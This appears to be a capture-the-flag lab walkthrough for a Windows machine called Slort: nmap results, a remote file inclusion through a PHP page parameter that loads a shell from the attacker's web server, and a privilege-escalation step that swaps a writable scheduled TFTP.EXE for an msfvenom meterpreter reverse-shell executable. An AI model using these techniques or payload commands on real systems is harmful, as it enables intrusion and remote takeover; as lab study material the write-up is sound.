## NMAP

```NMAP-Slort
??$ cat Slort.nmap 
# Nmap 7.94SVN scan initiated Sun Jul 28 14:40:09 2024 as: nmap -sC -sV -Pn -p- -oA Slort 192.168.55.53
Nmap scan report for 192.168.55.53
Host is up (0.0010s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, X11Probe: 
|_    Host '192.168.49.55' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.55.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.55.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=7/28%Time=66A65856%P=x86_64-pc-linux-gnu%r
SF:(NULL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Prob
SF:e,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## 4443

Found that it's XAMPP with phpmyadmin only available on localhost
BUT http://192.168.55.53:4443/site/index.php?page=main.php exists as a website
?page=x.php gives file inclusion

Testing Rmote File Inclusion, made local php test.php file
`python -m http.server 80`

Followed by setting page GET parameter to:
`index.php?page=http://192.168.49.55/test.php`

Used IvanSicenk shell due to Windows not Linux

Got Local Shell

```local-slort
C:\Users\rupert\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Users\rupert\Desktop

05/04/2022  01:53 AM    <DIR>          .
05/04/2022  01:53 AM    <DIR>          ..
07/28/2024  07:38 AM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)  28,624,515,072 bytes free

C:\Users\rupert\Desktop>type local.txt
1d658995ae100cef6f252277ebd3eceb
```

## PrivEsc

Found nothing great from WinPeaSS

Found C:\\Backup folder with interesting file

```
PS C:\> cd Backup
PS C:\Backup> dir


    Directory: C:\Backup


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                           
-a----         6/12/2020   7:45 AM             73 info.txt                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE                                                             


PS C:\Backup> type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

Get-ACL on file shows perms:

```
PS C:\Backup> GET-ACL TFTP.EXE        Directory: C:\BackupPath     Owner        Access                                                                                           ----     -----        ------                                                                                           TFTP.EXE SLORT\rupert BUILTIN\Users Allow  FullControl... 
```

msfvenom an EXE and use that

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.55 LPORT=9001 -f exe -o reverse.exe`
